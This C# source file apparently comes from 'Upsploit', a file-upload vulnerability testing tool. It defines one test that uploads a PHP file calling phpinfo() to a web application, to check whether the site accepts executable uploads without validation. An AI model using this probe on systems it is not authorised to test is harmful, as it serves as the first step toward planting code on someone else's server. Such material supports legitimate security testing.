using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

/*
* Test #1
* Description: This test simply uploads a normal PHP file without any attempts to hide it.
*/
namespace Upsploit.Tests {
    class Test01 : Test{
        public override sealed string description { get; set; }
        public override sealed string validation { get; set; }

        public Test01() {
            description = "This test uploads a file (Test_1.php) with the MIME type \"application/x-httpd-php\", it makes no attempt to hide " +
                          "the file whatsoever." +
                          "\r\n\r\n" +
                          "The test will only work on websites with no validation.";

            validation = "Look for Test_1.php on the web application. If the file loads the phpinfo, the test was a success and the web application is vulnerable.\r\n\r\n" +
                         "If the webpage is no longer a php file or it doesn't render in the browser, the test failed.";
        }

        internal override async Task runTest(UploadRequest.UploadRequest request){
            const string data = "<?php\n"
                              + "  echo phpinfo();\n"
                              + "?>";

            request.setFileData(Encoding.ASCII.GetBytes(data));
            request.setFileContentType("application/x-httpd-php"); //Generally the default content-type used for php
            request.setFileName("Test_1.php");

            await request.send(); //Send the request and halt the thread until it completes
            printResult(request, "Test 01");
        }
    }
}